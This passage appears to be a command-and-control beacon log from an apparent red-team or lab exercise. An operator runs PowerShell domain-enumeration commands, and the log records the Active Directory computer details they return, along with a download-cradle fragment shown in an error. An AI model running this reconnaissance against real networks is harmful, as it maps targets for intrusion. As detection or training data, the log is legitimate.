+03/30 08:47:03 UTC [output]
+received output:
+ l-win1879               unknown
+ l-win1880               unknown
+ l-win1881               unknown
+ l-win1882               unknown
+ l-win1883               unknown
+ l-win1884               unknown
+ l-win1885               unknown
+ l-win1886               unknown
+ l-win1887               unknown
+ l-win1888               unknown
+ l-win1889               unknown
+ l-win1890               unknown
+ l-win1891               unknown
+ l-win1892               unknown
+ l-win1893               unknown
+ l-win1894               unknown
+ l-win1895               unknown
+ l-win1896               unknown
+ l-win1897               unknown
+ l-win1898               unknown
+ l-win1899               unknown
+ l-win1900               unknown
+ l-win1901               unknown
+ l-win1902               unknown
+ l-win1903               unknown
+ l-win1904               unknown
+ l-win1905               unknown
+ l-win1906               unknown
+ l-win1907               unknown
+ l-win1908               unknown
+ l-win1909               unknown
+ l-win1910               unknown
+ l-win1911               unknown
+ l-win1912               unknown
+ l-win1913               unknown
+ l-win1914               unknown
+ l-win1915               unknown
+ l-win1916               unknown
+ l-win1917               unknown
+ l-win1918               unknown
+ l-win1919               unknown
+ l-win1920               unknown
+ l-win1921               unknown
+ l-win1922               unknown
+ l-win1923               unknown
+ l-win1924               unknown
+ l-win1925               unknown
+ l-win1926               unknown
+ l-win1927               unknown
+ l-win1928               unknown
+ l-win1929               unknown
+ l-win1930               unknown
+ l-win1931               unknown
+ l-win1932               unknown
+ l-win1933               unknown
+ l-win1934               unknown
+ l-win1935               unknown
+ l-win1936               unknown
+ l-win1937               unknown
+ l-win1938               unknown
+ l-win1939               unknown
+ l-win1940               unknown
+ l-win1941               unknown
+ l-win1942               unknown
+ l-win1943               unknown
+ l-win1944               unknown
+ l-win1945               unknown
+ l-win1946               unknown
+ l-win1947               unknown
+ l-win1948               unknown
+ l-win1949               unknown
+ l-win1950               unknown
+ l-win1951               unknown
+ l-win1952               unknown
+ l-win1953               unknown
+ l-win1954               unknown
+ l-win1955               unknown
+ l-win1956               unknown
+ l-win1957               unknown
+ l-win1958               unknown
+ l-win1959               unknown
+ l-win1960               unknown
+ l-win1961               unknown
+ l-win1962               unknown
+ l-win1963               unknown
+ l-win1964               unknown
+ l-win1965               unknown
+ l-win1966               unknown
+ l-win1967               unknown
+ l-win1968               unknown
+ l-win1969               unknown
+ l-win1970               unknown
+ l-win1971               unknown
+ l-win1972               unknown
+ l-win1973               unknown
+ l-win1974               unknown
+ l-win1975               unknown
+ l-win1976               unknown
+ l-win1977               unknown
+ l-win1978               unknown
+ l-win1979               unknown
+ l-win1980               unknown
+ l-win1981               unknown
+ l-win1982               unknown
+ l-win1983               unknown
+ l-win1984               unknown
+ l-win1985               unknown
+ l-win1986               unknown
+ l-win1987               unknown
+ l-win1988               unknown
+ l-win1989               unknown
+ l-win1990               unknown
+ l-win1991               unknown
+ l-win1992               unknown
+ l-win1993               unknown
+ l-win1994               unknown
+ l-win1995               unknown
+ l-win1996               unknown
+ l-win1997               unknown
+ l-win1998               unknown
+ l-win1999               unknown
+ l-win2000               unknown
+ l-win2001               unknown
+ l-win2002               unknown
+ l-win2003               unknown
+ l-win2004               unknown
+ l-win2005               unknown
+ l-win2006               unknown
+ l-win2007               unknown
+ l-win2008               unknown
+ l-win2009               unknown
+ l-win2010               unknown
+ l-win2011               unknown
+ l-win2012               unknown
+ l-win2013               unknown
+ l-win2014               unknown
+ l-win2015               unknown
+ l-win2016               unknown
+ l-win2017               unknown
+ l-win2018               unknown
+ l-win2019               unknown
+ l-win2020               unknown
+ l-win2021               unknown
+ l-win2022               unknown
+ l-win2023               unknown
+ l-win2024               unknown
+ l-win2025               unknown
+ l-win2026               unknown
+ l-win2027               unknown
+ l-win2028               unknown
+ l-win2029               unknown
+ l-win2030               unknown
+ l-win2031               unknown
+ l-win2032               unknown
+ l-win2033               unknown
+ l-win2034               unknown
+ l-win2035               unknown
+ l-win2036               unknown
+ l-win2037               unknown
+ l-win2038               unknown
+ l-win2039               unknown
+ l-win2040               unknown
+ l-win2041               unknown
+ l-win2042               unknown
+ l-win2043               unknown
+ l-win2044               unknown
+ l-win2045               unknown
+ l-win2046               unknown
+ l-win2047               unknown
+ l-win2048               unknown
+ l-win2049               unknown
+ l-win2050               unknown
+ l-win2051               unknown
+ l-win2052               unknown
+ l-win2053               unknown
+ l-win2054               unknown
+ l-win2055               unknown
+ l-win2056               unknown
+ l-win2057               unknown
+ l-win2058               unknown
+ l-win2059               unknown
+ l-win2060               unknown
+ l-win2061               unknown
+ l-win2062               unknown
+ l-win2063               unknown
+ l-win2064               unknown
+ l-win2065               unknown
+ l-win2066               unknown
+ l-win2067               unknown
+ l-win2068               unknown
+ l-win2069               unknown
+ l-win2070               unknown
+ l-win2071               unknown
+ l-win2072               unknown
+ l-win2073               unknown
+ l-win2074               unknown
+ l-win2075               unknown
+ l-win2076               unknown
+ l-win2077               unknown
+ l-win2078               unknown
+ l-win2079               unknown
+ l-win2080               unknown
+ l-win2081               unknown
+ l-win2082               unknown
+ l-win2083               unknown
+ l-win2084               unknown
+ l-win2085               unknown
+ l-win2086               unknown
+ l-win2087               unknown
+ l-win2088               unknown
+ l-win2089               unknown
+ l-win2090               unknown
+ l-win2091               unknown
+ l-win2092               unknown
+ l-win2093               unknown
+ l-win2094               unknown
+ l-win2095               unknown
+ l-win2096               unknown
+ l-win2097               unknown
+ l-win2098               unknown
+ l-win2099               unknown
+ l-win2100               unknown
+ l-win2101               unknown
+ l-win2102               unknown
+ l-win2103               unknown
+ l-win2104               unknown
+ l-win2105               unknown
+ l-win2106               unknown
+ l-win2107               unknown
+ l-win2108               unknown
+ l-win2109               unknown
+ l-win2110               unknown
+ l-win2111               unknown
+ l-win2112               unknown
+ l-win2113               unknown
+ l-win2114               unknown
+ l-win2115               unknown
+ l-win2116               unknown
+ l-win2117               unknown
+ l-win2118               unknown
+ l-win2119               unknown
+ l-win2120               unknown
+ l-win2121               unknown
+ l-win2122               unknown
+ l-win2123               unknown
+ l-win2124               unknown
+ l-win2125               unknown
+ l-win2126               unknown
+ l-win2127               unknown
+ l-win2128               unknown
+ l-win2129               unknown
+ l-win2130               unknown
+ l-win2131               unknown
+ l-win2132               unknown
+ l-win2133               unknown
+ l-win2134               unknown
+ l-win2135               unknown
+ l-win2136               unknown
+ l-win2137               unknown
+ l-win2138               unknown
+ l-win2139               unknown
+ l-win2140               unknown
+ l-win2141               unknown
+ l-win2142               unknown
+ l-win2143               unknown
+ l-win2144               unknown
+ l-win2145               unknown
+ l-win2146               unknown
+ l-win2147               unknown
+ l-win2148               unknown
+ l-win2149               unknown
+ l-win2150               unknown
+ l-win2151               unknown
+ l-win2152               unknown
+ l-win2153               unknown
+ l-win2154               unknown
+ l-win2155               unknown
+ l-win2156               unknown
+ l-win2157               unknown
+ l-win2158               unknown
+ l-win2159               unknown
+ l-win2160               unknown
+ l-win2161               unknown
+ l-win2162               unknown
+ l-win2163               unknown
+ l-win2164               unknown
+ l-win2165               unknown
+ l-win2166               unknown
+ l-win2167               unknown
+ l-win2168               unknown
+ l-win2169               unknown
+ l-win2170               unknown
+ l-win2171               unknown
+ l-win2172               unknown
+ l-win2173               unknown
+ l-win2174               unknown
+ l-win2175               unknown
+ l-win2176               unknown
+ l-win2177               unknown
+ l-win2178               unknown
+ l-win2179               unknown
+ l-win2180               unknown
+ l-win2181               unknown
+ l-win2182               unknown
+ l-win2183               unknown
+ l-win2184               unknown
+ l-win2185               unknown
+ l-win2186               unknown
+ l-win2187               unknown
+ l-win2188               unknown
+ l-win2189               unknown
+ l-win2190               unknown
+ l-win2191               unknown
+ l-win2192               unknown
+ l-win2193               unknown
+ l-win2194               unknown
+ l-win2195               unknown
+ l-win2196               unknown
+ l-win2197               unknown
+ l-win2198               unknown
+ l-win2199               unknown
+ l-win2200               unknown
+ l-win2201               unknown
+ l-win2202               unknown
+ l-win2203               unknown
+ l-win2204               unknown
+ l-win2205               unknown
+ l-win2206               unknown
+ l-win2207               unknown
+ l-win2208               unknown
+ l-win2209               unknown
+ l-win2210               unknown
+ l-win2211               unknown
+ l-win2212               unknown
+ l-win2213               unknown
+ l-win2214               unknown
+ l-win2215               unknown
+ l-win2216               unknown
+ l-win2217               unknown
+ l-win2218               unknown
+ l-win2219               unknown
+ l-win2220               unknown
+ l-win2221               unknown
+ l-win2222               unknown
+ l-win2223               unknown
+ l-win2224               unknown
+ l-win2225               unknown
+ l-win2226               unknown
+ l-win2227               unknown
+ l-win2228               unknown
+ l-win2229               unknown
+ l-win2230               unknown
+ l-win2231               unknown
+ l-win2232               unknown
+ l-win2233               unknown
+ l-win2234               unknown
+ l-win2235               unknown
+ l-win2236               unknown
+ l-win2237               unknown
+ l-win2238               unknown
+ l-win2239               unknown
+ l-win2240               unknown
+ l-win2241               unknown
+ l-win2242               unknown
+ l-win2243               unknown
+ l-win2244               unknown
+ l-win2245               unknown
+ l-win2246               unknown
+ l-win2247               unknown
+ l-win2248               unknown
+ l-win2249               unknown
+ l-win2250               unknown
+ l-win2251               unknown
+ l-win2252               unknown
+ l-win2253               unknown
+ l-win2254               unknown
+ l-win2255               unknown
+ l-win2256               unknown
+ l-win2257               unknown
+ l-win2258               unknown
+ l-win2259               unknown
+ l-win2260               unknown
+ l-win2261               unknown
+ l-win2262               unknown
+ l-win2263               unknown
+ l-win2264               unknown
+ l-win2265               unknown
+ l-win2266               unknown
+ l-win2267               unknown
+ l-win2268               unknown
+ l-win2269               unknown
+ l-win2270               unknown
+ l-win2271               unknown
+ l-win2272               unknown
+ l-win2273               unknown
+ l-win2274               unknown
+ l-win2275               unknown
+ l-win2276               unknown
+ l-win2277               unknown
+ l-win2278               unknown
+ l-win2279               unknown
+ l-win2280               unknown
+ s-lin100                unknown
+ s-lin101                unknown
+ s-lin102                unknown
+ s-lin103                unknown
+ s-lin104                unknown
+ s-lin105                unknown
+ s-lin106                unknown
+ s-lin107                unknown
+ s-lin108                unknown
+ s-lin109                unknown
+ s-lin110                unknown
+ s-lin111                unknown
+ s-lin112                unknown
+ s-lin113                unknown
+ s-lin114                unknown
+ s-lin115                unknown
+ s-lin116                unknown
+ s-lin117                unknown
+ s-lin118                unknown
+ s-lin119                unknown
+ s-lin120                unknown
+ s-lin121                unknown
+ s-lin122                unknown
+ s-lin123                unknown
+ s-lin124                unknown
+ s-lin125                unknown
+ s-lin126                unknown
+ s-lin127                unknown
+ s-lin128                unknown
+ s-lin129                unknown
+ s-lin130                unknown
+ s-lin131                unknown
+ s-lin132                unknown
+ s-lin133                unknown
+ s-lin134                unknown
+ s-lin135                unknown
+ s-lin136                unknown
+ s-lin137                unknown
+ s-lin138                unknown
+ s-lin139                unknown
+ s-lin140                unknown
+ s-lin141                unknown
+ s-lin142                unknown
+ s-lin143                unknown
+ s-lin144                unknown
+ s-lin145                unknown
+ s-lin146                unknown
+ s-lin147                unknown
+ s-lin148                unknown
+ s-lin149                unknown
+ s-lin150                unknown
+ s-lin151                unknown
+ s-lin152                unknown
+ s-lin153                unknown
+ s-lin154                unknown
+ s-lin155                unknown
+ s-lin156                unknown
+ s-lin157                unknown
+ s-lin158                unknown
+ s-lin159                unknown
+ s-lin160                unknown
+ s-lin161                unknown
+ s-lin162                unknown
+ s-lin163                unknown
+ s-lin164                unknown
+ s-lin165                unknown
+ s-lin166                unknown
+ s-lin167                unknown
+ s-lin168                unknown
+ s-lin169                unknown
+ s-lin170                unknown
+ s-lin171                unknown
+ s-lin172                unknown
+ s-lin173                unknown
+ s-lin174                unknown
+ s-lin175                unknown
+ s-lin176                unknown
+ s-lin177                unknown
+ s-lin178                unknown
+ s-lin179                unknown
+ s-lin180                unknown
+ s-lin181                unknown
+ s-lin182                unknown
+ s-lin183                unknown
+ s-lin184                unknown
+ s-lin185                unknown
+ s-lin186                unknown
+ s-lin187                unknown
+ s-lin188                unknown
+ s-lin189                unknown
+ s-lin190                unknown
+ s-lin191                unknown
+ s-lin192                unknown
+ s-lin193                unknown
+ s-lin194                unknown
+ s-lin195                unknown
+ s-lin196                unknown
+ s-lin197                unknown
+ s-lin198                unknown
+ s-lin199                unknown
+ s-lin200                unknown
+ s-lin201                unknown
+ s-lin202                unknown
+ s-lin203                unknown
+ s-lin204                unknown
+ s-lin205                unknown
+ s-lin206                unknown
+ s-lin207                unknown
+ s-lin208                unknown
+ s-lin209                unknown
+ s-lin210                unknown
+ s-lin211                unknown
+ s-lin212                unknown
+ s-lin213                unknown
+ s-lin214                unknown
+ s-lin215                unknown
+ s-lin216                unknown
+ s-lin217                unknown
+ s-lin218                unknown
+ s-lin219                unknown
+ s-lin220                unknown
+ s-lin221                unknown
+ s-lin222                unknown
+ s-lin223                unknown
+ s-lin224                unknown
+ s-lin225                unknown
+ s-lin226                unknown
+ s-lin227                unknown
+ s-lin228                unknown
+ s-lin229                unknown
+ s-lin230                unknown
+ s-lin231                unknown
+ s-lin232                unknown
+ s-lin233                unknown
+ s-lin234                unknown
+ s-lin235                unknown
+ s-lin236                unknown
+ s-lin237                unknown
+ s-lin238                unknown
+ s-lin239                unknown
+ s-lin240                unknown
+ s-lin241                unknown
+ s-lin242                unknown
+ s-lin243                unknown
+ s-lin244                unknown
+ s-lin245                unknown
+ s-lin246                unknown
+ s-lin247                unknown
+ s-lin248                unknown
+ s-lin249                unknown
+ s-lin250                unknown
+ s-lin251                unknown
+ s-lin252                unknown
+ s-lin253                unknown
+ s-lin254                unknown
+ s-lin255                unknown
+ s-lin256                unknown
+ s-lin257                unknown
+ s-lin258                unknown
+ s-lin259                unknown
+ s-lin260                unknown
+ s-lin261                unknown
+ s-lin262                unknown
+ s-lin263                unknown
+ s-lin264                unknown
+ s-lin265                unknown
+ s-lin266                unknown
+ s-lin267                unknown
+ s-lin268                unknown
+ s-lin269                unknown
+ s-lin270                unknown
+ s-lin271                unknown
+ s-lin272                unknown
+ s-lin273                unknown
+ s-lin274                unknown
+ s-lin275                unknown
+ s-lin276                unknown
+ s-lin277                unknown
+ s-lin278                unknown
+ s-lin279                unknown
+ s-lin280                unknown
+ s-lin281                unknown
+ s-lin282                unknown
+ s-lin283                unknown
+ s-lin284                unknown
+ s-lin285                unknown
+ s-lin286                unknown
+ s-lin287                unknown
+ s-lin288                unknown
+ s-lin289                unknown
+ s-lin290                unknown
+ s-lin291                unknown
+ s-lin292                unknown
+ s-lin293                unknown
+ s-lin294                unknown
+ s-lin295                unknown
+ s-lin296                unknown
+ s-lin297                unknown
+ s-lin298                unknown
+ s-lin299                unknown
+ s-lin300                unknown
+ pcd-100                 unknown
+ pcd-101                 unknown
+ pcd-102                 unknown
+ pcd-103                 unknown
+ pcd-104                 unknown
+ pcd-105                 unknown
+ pcd-106                 unknown
+ pcd-107                 unknown
+ pcd-108                 unknown
+ pcd-109                 unknown
+ pcd-110                 unknown
+ pcd-111                 unknown
+ pcd-112                 unknown
+ pcd-113                 unknown
+ pcd-114                 unknown
+ pcd-115                 unknown
+ pcd-116                 unknown
+ pcd-117                 unknown
+ pcd-118                 unknown
+ pcd-119                 unknown
+ pcd-120                 unknown
+ pcd-121                 unknown
+ S-WIN43                 10.1.2.13
+ S-WIN44                 10.1.2.14
+ L-WIN223                10.1.3.10
+ L-WIN224                10.1.3.11
+ L-WIN225                10.1.3.12
+ L-WIN226                10.1.3.13
+ L-WIN227                10.1.4.10
+ L-WIN228                10.1.4.11
+ S-WIN45                 10.2.1.20
+
+
+03/30 08:48:32 UTC [input] <neo> powreshell get-domaincomputer
+03/30 08:48:32 UTC [error] Unknown command: powreshell get-domaincomputer
+03/30 08:48:37 UTC [input] <neo> powershell get-domaincomputer
+03/30 08:48:37 UTC [task] <T1086> Tasked beacon to run: get-domaincomputer
+03/30 08:48:38 UTC [checkin] host called home, sent: 321 bytes
+03/30 08:48:40 UTC [output]
+received output:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">get-domaincomputer : The term 'get-domaincomputer' is not recognized as the name of a cmdlet, function, script file, _x000D__x000A_</S><S S="Error">or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and _x000D__x000A_</S><S S="Error">try again._x000D__x000A_</S><S S="Error">At line:1 char:75_x000D__x000A_</S><S S="Error">+ ... client).DownloadString('http://127.0.0.1:26388/'); get-domaincomputer_x000D__x000A_</S><S S="Error">+                                                        ~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (get-domaincomputer:String) [], CommandNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
+
+03/30 08:49:26 UTC [input] <neo> powershell get-netcomputer
+03/30 08:49:26 UTC [task] <T1086> Tasked beacon to run: get-netcomputer
+03/30 08:49:27 UTC [checkin] host called home, sent: 313 bytes
+03/30 08:49:29 UTC [output]
+received output:
+#< CLIXML
+S-WIN22.stroop.local
+S-WIN21.stroop.local
+S-WIN43.stroop.local
+S-WIN44.stroop.local
+L-WIN223.stroop.local
+L-WIN224.stroop.local
+L-WIN225.stroop.local
+L-WIN226.stroop.local
+L-WIN227.stroop.local
+L-WIN228.stroop.local
+S-WIN45.stroop.local
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+
+03/30 08:49:38 UTC [input] <neo> powershell get-netcomputer -fulldata
+03/30 08:49:38 UTC [task] <T1086> Tasked beacon to run: get-netcomputer -fulldata
+03/30 08:49:38 UTC [checkin] host called home, sent: 337 bytes
+03/30 08:49:40 UTC [output]
+received output:
+#< CLIXML
+
+
+logoncount                    : 14
+msds-generationid             : {116, 93, 120, 30...}
+serverreferencebl             : CN=S-WIN22,CN=Servers,CN=FactoryNL,CN=Sites,CN=Configuration,DC=stroop,DC=local
+iscriticalsystemobject        : True
+distinguishedname             : CN=S-WIN22,OU=Domain Controllers,DC=stroop,DC=local
+objectclass                   : {top, person, organizationalPerson, user...}
+lastlogontimestamp            : 3/29/2020 10:39:08 AM
+name                          : S-WIN22
+objectsid                     : S-1-5-21-2163199188-2306780613-1636707950-4887
+samaccountname                : S-WIN22$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : 805306369
+whenchanged                   : 3/29/2020 10:45:35 AM
+countrycode                   : 0
+cn                            : S-WIN22
+accountexpires                : 9223372036854775807
+adspath                       : LDAP://CN=S-WIN22,OU=Domain Controllers,DC=stroop,DC=local
+instancetype                  : 4
+msdfsr-computerreferencebl    : CN=S-WIN22,CN=Topology,CN=Domain System 
+                                Volume,CN=DFSR-GlobalSettings,CN=System,DC=stroop,DC=local
+objectguid                    : 739b8d8a-66db-4d1f-accb-3b54c02be81f
+operatingsystem               : Windows Server 2012 R2 Datacenter
+operatingsystemversion        : 6.3 (9600)
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=stroop,DC=local
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {DNS/S-WIN22.stroop.local, HOST/S-WIN22.stroop.local/STROOP, 
+                                RPC/74e70e8d-7d61-4bdc-a817-63fa62eb73b2._msdcs.stroop.local, 
+                                GC/S-WIN22.stroop.local/stroop.local...}
+usncreated                    : 8042
+lastlogon                     : 3/30/2020 7:51:46 AM
+useraccountcontrol            : 532480
+whencreated                   : 3/29/2020 10:39:08 AM
+primarygroupid                : 516
+pwdlastset                    : 3/29/2020 10:39:08 AM
+msds-supportedencryptiontypes : 28
+usnchanged                    : 28707
+ridsetreferences              : CN=RID Set,CN=S-WIN22,OU=Domain Controllers,DC=stroop,DC=local
+dnshostname                   : S-WIN22.stroop.local
+
+serverreferencebl             : CN=S-WIN21,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=stroop,DC
+                                =local
+iscriticalsystemobject        : True
+distinguishedname             : CN=S-WIN21,OU=Domain Controllers,DC=stroop,DC=local
+objectclass                   : {top, person, organizationalPerson, user...}
+lastlogontimestamp            : 3/29/2020 9:54:48 AM
+name                          : S-WIN21
+objectsid                     : S-1-5-21-2163199188-2306780613-1636707950-1001
+samaccountname                : S-WIN21$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : 805306369
+whenchanged                   : 3/29/2020 10:39:20 AM
+countrycode                   : 0
+cn                            : S-WIN21
+accountexpires                : 9223372036854775807
+adspath                       : LDAP://CN=S-WIN21,OU=Domain Controllers,DC=stroop,DC=local
+instancetype                  : 4
+msdfsr-computerreferencebl    : CN=S-WIN21,CN=Topology,CN=Domain System 
+                                Volume,CN=DFSR-GlobalSettings,CN=System,DC=stroop,DC=local
+objectguid                    : 2f094ab8-be92-40b1-aa06-63512f213122
+operatingsystem               : Windows Server 2012 R2 Datacenter
+operatingsystemversion        : 6.3 (9600)
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=stroop,DC=local
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/S-WIN21.stroop.local, 
+                                ldap/S-WIN21.stroop.local/ForestDnsZones.stroop.local, 
+                                ldap/S-WIN21.stroop.local/DomainDnsZones.stroop.local, TERMSRV/S-WIN21...}
+usncreated                    : 8029
+useraccountcontrol            : 532480
+whencreated                   : 3/29/2020 9:54:08 AM
+primarygroupid                : 516
+pwdlastset                    : 3/29/2020 9:54:24 AM
+msds-supportedencryptiontypes : 28
+usnchanged                    : 8029
+ridsetreferences              : CN=RID Set,CN=S-WIN21,OU=Domain Controllers,DC=stroop,DC=local
+dnshostname                   : S-WIN21.stroop.local
+
+iscriticalsystemobject        : False
+distinguishedname             : CN=S-WIN43,OU=Servers,OU=Office,OU=Systems,DC=stroop,DC=local
+objectclass                   : {top, person, organizationalPerson, user...}
+lastlogontimestamp            : 3/29/2020 10:12:41 AM
+name                          : S-WIN43
+objectsid                     : S-1-5-21-2163199188-2306780613-1636707950-4879
+samaccountname                : S-WIN43$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : 805306369
+whenchanged                   : 3/29/2020 10:39:40 AM
+countrycode                   : 0
+cn                            : S-WIN43
+accountexpires                : 9223372036854775807
+adspath                       : LDAP://CN=S-WIN43,OU=Servers,OU=Office,OU=Systems,DC=stroop,DC=local
+instancetype                  : 4
+usncreated                    : 20814
+objectguid                    : 20a22808-5fb5-4f65-b2cf-591028941467
+operatingsystem               : Windows Server 2012 R2 Datacenter
+operatingsystemversion        : 6.3 (9600)
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=stroop,DC=local
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {TERMSRV/S-WIN43, TERMSRV/S-WIN43.stroop.local, WSMAN/S-WIN43, 
+                                WSMAN/S-WIN43.stroop.local...}
+useraccountcontrol            : 4096
+whencreated                   : 3/29/2020 10:12:40 AM
+primarygroupid                : 515
+pwdlastset                    : 3/29/2020 10:12:40 AM
+msds-supportedencryptiontypes : 28
+usnchanged                    : 20814
+dnshostname                   : S-WIN43.stroop.local
+
+iscriticalsystemobject        : False
+distinguishedname             : CN=S-WIN44,OU=Servers,OU=Office,OU=Systems,DC=stroop,DC=local
+objectclass                   : {top, person, organizationalPerson, user...}
+lastlogontimestamp            : 3/29/2020 10:15:40 AM
+name                          : S-WIN44
+objectsid                     : S-1-5-21-2163199188-2306780613-1636707950-4880
+samaccountname                : S-WIN44$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : 805306369
+whenchanged                   : 3/29/2020 10:39:40 AM
+countrycode                   : 0
+cn                            : S-WIN44
+accountexpires                : 9223372036854775807
+adspath                       : LDAP://CN=S-WIN44,OU=Servers,OU=Office,OU=Systems,DC=stroop,DC=local
+instancetype                  : 4
+usncreated                    : 20816
+objectguid                    : 66124476-67bb-42c7-984e-49207ad97de4
+operatingsystem               : Windows Server 2016 Datacenter
+operatingsystemversion        : 10.0 (14393)
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=stroop,DC=local
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {WSMAN/S-WIN44, WSMAN/S-WIN44.stroop.local, TERMSRV/S-WIN44, 
+                                TERMSRV/S-WIN44.stroop.local...}
+memberof                      : CN=Event Log Readers,CN=Builtin,DC=stroop,DC=local
+useraccountcontrol            : 4096
+whencreated                   : 3/29/2020 10:15:40 AM
+primarygroupid                : 515
+pwdlastset                    : 3/29/2020 10:15:40 AM
+msds-supportedencryptiontypes : 28
+usnchanged                    : 20816
+dnshostname                   : S-WIN44.stroop.local
+
+logoncount                    : 11
+iscriticalsystemobject        : False
+distinguishedname             : CN=L-WIN223,OU=EUC,OU=Office,OU=Systems,DC=stroop,DC=local
+objectclass                   : {top, person, organizationalPerson, user...}
+lastlogontimestamp            : 3/29/2020 10:18:00 AM
+objectsid                     : S-1-5-21-2163199188-2306780613-1636707950-4881
+samaccountname                : L-WIN223$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : 805306369
+whenchanged                   : 3/29/2020 10:39:40 AM
+countrycode                   : 0
+cn                            : L-WIN223
+accountexpires                : 9223372036854775807
+adspath                       : LDAP://CN=L-WIN223,OU=EUC,OU=Office,OU=Systems,DC=stroop,DC=local
+instancetype                  : 4
+usncreated                    : 20818
+objectguid                    : 1878f205-7905-4b97-814e-990c3d8a9909
+operatingsystem               : Windows 10 Enterprise LTSC
+operatingsystemversion        : 10.0 (17763)
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=stroop,DC=local
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {WSMAN/L-WIN223, WSMAN/L-WIN223.stroop.local, TERMSRV/L-WIN223, 
+                                TERMSRV/L-WIN223.stroop.local...}
+lastlogon                     : 3/30/2020 8:40:35 AM
+usnchanged                    : 20818
+useraccountcontrol            : 4096
+whencreated                   : 3/29/2020 10:18:00 AM
+primarygroupid                : 515
+pwdlastset                    : 3/29/2020 10:18:00 AM
+msds-supportedencryptiontypes : 28
+name                          : L-WIN223
+dnshostname                   : L-WIN223.stroop.local
+
+logoncount                    : 5
+iscriticalsystemobject        : False
+description                   : Workstation of w.trommel
+distinguishedname             : CN=L-WIN224,OU=EUC,OU=Office,OU=Systems,DC=stroop,DC=local
+objectclass                   : {top, person, organizationalPerson, user...}
+lastlogontimestamp            : 3/29/2020 10:20:19 AM
+name                          : L-WIN224
+objectsid                     : S-1-5-21-2163199188-2306780613-1636707950-4882
+samaccountname                : L-WIN224$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : 805306369
+whenchanged                   : 3/29/2020 11:30:05 AM
+countrycode                   : 0
+cn                            : L-WIN224
+accountexpires                : 9223372036854775807
+adspath                       : LDAP://CN=L-WIN224,OU=EUC,OU=Office,OU=Systems,DC=stroop,DC=local
+instancetype                  : 4
+usncreated                    : 20820
+objectguid                    : 4413516a-6c9d-4c02-897c-dfa11d70ebf6
+operatingsystem               : Windows 10 Enterprise LTSC
+operatingsystemversion        : 10.0 (17763)
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=stroop,DC=local
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {WSMAN/L-WIN224, WSMAN/L-WIN224.stroop.local, TERMSRV/L-WIN224, 
+                                TERMSRV/L-WIN224.stroop.local...}
+lastlogon                     : 3/30/2020 8:36:46 AM
+useraccountcontrol            : 4096
+whencreated                   : 3/29/2020 10:20:19 AM
+primarygroupid                : 515
+pwdlastset                    : 3/29/2020 10:20:19 AM
+msds-supportedencryptiontypes : 28
+usnchanged                    : 30980
+dnshostname                   : L-WIN224.stroop.local
+
+logoncount                    : 1
+iscriticalsystemobject        : False
+distinguishedname             : CN=L-WIN225,OU=EUC,OU=Office,OU=Systems,DC=stroop,DC=local
+objectclass                   : {top, person, organizationalPerson, user...}
+lastlogontimestamp            : 3/29/2020 10:22:39 AM
+objectsid                     : S-1-5-21-2163199188-2306780613-1636707950-4883
+samaccountname                : L-WIN225$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : 805306369
+whenchanged                   : 3/29/2020 10:39:40 AM
+countrycode                   : 0
+cn                            : L-WIN225
+accountexpires                : 9223372036854775807
+adspath                       : LDAP://CN=L-WIN225,OU=EUC,OU=Office,OU=Systems,DC=stroop,DC=local
+instancetype                  : 4
+usncreated                    : 20822
+objectguid                    : 7dec6123-03bf-42f9-b65a-5afdcdddb997
+operatingsystem               : Windows 10 Enterprise LTSC
+operatingsystemversion        : 10.0 (17763)
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=stroop,DC=local
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {WSMAN/L-WIN225, WSMAN/L-WIN225.stroop.local, TERMSRV/L-WIN225, 
+                                TERMSRV/L-WIN225.stroop.local...}
+lastlogon                     : 3/30/2020 8:43:44 AM
+usnchanged                    : 20822
